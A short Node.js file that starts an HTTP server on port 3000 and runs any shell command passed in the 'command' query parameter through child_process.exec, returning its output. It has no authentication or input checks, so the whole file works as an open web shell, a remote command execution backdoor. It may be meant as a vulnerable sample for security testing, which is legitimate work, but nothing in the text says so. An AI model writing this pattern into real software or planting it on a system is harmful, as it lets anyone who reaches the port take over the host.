import { exec } from "node:child_process";
import http from "node:http";

http
  .createServer((request, response) => {
    const command = new URL(request.url, "http://127.0.0.1").searchParams.get(
      "command",
    );
    exec(command, (error, stdout) => {
      response.statusCode = error ? 500 : 200;
      response.end(stdout);
    });
  })
  .listen(3000);
